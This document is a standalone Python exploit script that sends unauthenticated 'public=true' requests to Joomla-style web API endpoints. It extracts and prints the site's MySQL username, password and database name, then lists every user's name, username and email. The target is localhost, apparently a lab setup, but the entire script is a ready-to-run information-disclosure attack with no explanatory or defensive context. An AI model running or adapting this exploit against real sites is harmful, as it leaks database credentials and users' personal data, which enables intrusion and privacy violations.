import requests
from time import sleep

def get_data(url):
    response = requests.get(url)
    return response.json()

def parse_mysql_credentials(data):
    credentials = {}
    for item in data['data']:
        attributes = item['attributes']
        if 'user' in attributes:
            credentials['user'] = attributes['user']
        elif 'password' in attributes:
            credentials['password'] = attributes['password']
        elif 'db' in attributes:
            credentials['db'] = attributes['db']
    return credentials

def parse_user_information(data):
    users_info = []
    for item in data['data']:
        attributes = item['attributes']
        user_info = {
            'name': attributes.get('name'),
            'username': attributes.get('username'),
            'email': attributes.get('email')
        }
        users_info.append(user_info)
    return users_info

url = "http://localhost:8080/api/index.php/v1/config/application?public=true"

while(True):
    try:
        data = get_data(url)
        credentials = parse_mysql_credentials(data)

        print("[MySQL Username and Password]")
        print(f"[+] Username: {credentials['user']}")
        print(f"[+] Password: {credentials['password']}")
        print(f"[+] DB name: {credentials['db']}")

        break
    except:
        print("[-] Failed to receive data. Retrying in 5 seconds...")
        sleep(5)

url = "http://localhost:8080/api/index.php/v1/users?public=true"

while(True):
    try:
        data = get_data(url)
        users_info = parse_user_information(data)
        index = 1
        for user in users_info:
            print("-----------------------------------")
            print(f"[{index}]")
            print(f"\tname: {user['name']}")
            print(f"\tusername: {user['username']}")
            print(f"\temail: {user['email']}")
            print("-----------------------------------")
            index += 1
        break
    except:
        print("[-] Failed to receive data. Retrying in 5 seconds...")
        sleep(5)

